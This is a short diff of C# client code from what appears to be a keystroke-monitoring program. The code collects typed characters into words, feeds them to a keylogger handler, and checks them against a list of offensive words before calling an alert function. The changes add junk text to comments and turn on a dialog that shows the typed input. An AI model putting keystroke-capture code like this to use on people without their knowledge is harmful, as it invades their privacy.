@@ -54,9 +54,9 @@ namespace ClientSide
                     {
                         input += (char)i;
 
-                        if (i == 32) // if type space 
+                        if (i == 32) // if type space gg 
                         {
-                            //ShowErrorDialog(input+", "+ifLive);atata atara atara 
+                            //ShowErrorDialog(input+", "+ifLive);atata atara atara abbo 
                             if (ifLive)
                             {
                                 wordFromKeylogger handler = Program.updateCurrentKeylogger;
@@ -64,9 +64,9 @@ namespace ClientSide
                             }
 
 
-                            //ShowErrorDialog(input); atara atara atara a a
-                            string replacement = input.Replace(" ", "");
-                            //ShowErrorDialog(replacement);
+                            ShowErrorDialog(input);  
+                            string replacement = input.Replace(" ", "").ToLower();
+                            //ShowErrorDialog(replacement);gg 
                             foreach (string badWord in offensiveWords)
                             {
 
@@ -74,7 +74,7 @@ namespace ClientSide
                                 if (replacement.ToLower().Equals(badWord) && xb.Length > 0)
                                 {
                                     reportOrSendAlert(badWord);
-                                }   // atara 
+                                }   
                             }
                             input = "";
                         }
